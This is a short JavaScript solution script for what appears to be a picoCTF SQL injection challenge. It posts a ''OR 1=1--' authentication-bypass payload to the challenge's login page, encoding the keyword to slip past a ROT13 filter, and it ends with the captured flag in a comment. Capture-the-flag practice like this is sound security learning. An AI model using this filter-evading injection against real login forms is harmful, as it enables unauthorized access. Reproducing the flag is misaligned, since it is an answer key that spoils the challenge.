const axios = require('axios');


function rev_rot13(s) {
  let ret = '';
  for (let i = 0; i < s.length; i++) {
    ret += String.fromCharCode(s[i].charCodeAt() - 13);
  }
  return ret;
}


async function main() {
  const payload = "' " + rev_rot13("OR") + " 1=1--";
  console.log(payload);
  const params = new URLSearchParams({ password: payload, debug: '1' });
  const res = await axios.post(
    'https://jupiter.challenges.picoctf.org/problem/54253/login.php',
    params);
  console.log(res.data);
}


main().catch((err) => { console.log(err) });


// picoCTF{3v3n_m0r3_SQL_7f5767f6}
